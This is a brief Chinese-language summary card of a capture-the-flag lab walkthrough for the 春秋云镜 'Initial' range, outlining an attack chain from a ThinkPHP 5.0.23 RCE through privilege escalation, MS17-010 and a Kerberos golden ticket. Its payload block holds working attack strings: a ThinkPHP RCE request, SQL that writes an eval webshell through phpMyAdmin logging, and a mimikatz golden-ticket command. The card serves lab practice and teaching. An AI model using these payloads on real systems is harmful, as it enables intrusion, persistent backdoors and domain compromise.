---
title: "春秋云镜-Initial打靶记录"
category: web
tags: ["春秋云镜靶场", "web", "ThinkPHP 5.0.23", "sudo mysql提权", "信呼OA", "phpMyAdmin日志写马"]
signals: ["春秋云镜靶场 2024", "ThinkPHP 5.0.23", "sudo mysql提权", "信呼OA", "phpMyAdmin日志写马", "MS17-010", "黄金票据", "Kerberos", "rce", "Initial", "ThinkPHP", "flag", "ThinkPHP5023", "RCE"]
difficulty: easy
source: "https://www.ctfiot.com/173290.html"
tools: ["C", "ThinkPHP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 春秋云镜-Initial打靶记录

> 赛事：春秋云镜靶场 2024 | 方向：web | 难度：easy | 工具：C、ThinkPHP

## 一句话总结

春秋云镜Initial完整打靶：ThinkPHP+信呼OA+MS17-010+黄金票据四步全flag

## 攻击链

1. ThinkPHP5023 RCE→写入一句话→蚁剑→sudo mysql -e提权flag1→frp代理→信呼OA+phpMyAdmin写shell flag2→MS17-010打WIN7→kiwi dcsync导出krbtgt hash→伪造黄金票据→wmiexec登录DC读flag3

## 关键 payload

```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls;set global general_log='ON';set global general_log_file='C:/phpStudy/PHPTutorial/WWW/111.php';select '<?php eval($_POST[cmd]);?>';kerberos::golden /user:administrator /domain:xiaorang.lab /sid:S-1-5-21-314492864-3856862959-4045974917-502 /krbtgt:fb812eea13a18b7fcdb8e6d67ddc205b /ptt
```

## 经验教训

入门靶场三种getshell姿势（ThinkPHP/信呼上传/phpMyAdmin日志写马）+ Kerberos黄金票据原理与利用

## 标签

ThinkPHP 5.0.23、sudo mysql提权、信呼OA、phpMyAdmin日志写马、MS17-010、黄金票据、Kerberos

## 参考来源

- https://www.ctfiot.com/173290.html
- 原文件：春秋云镜-Initial打靶记录.full.md
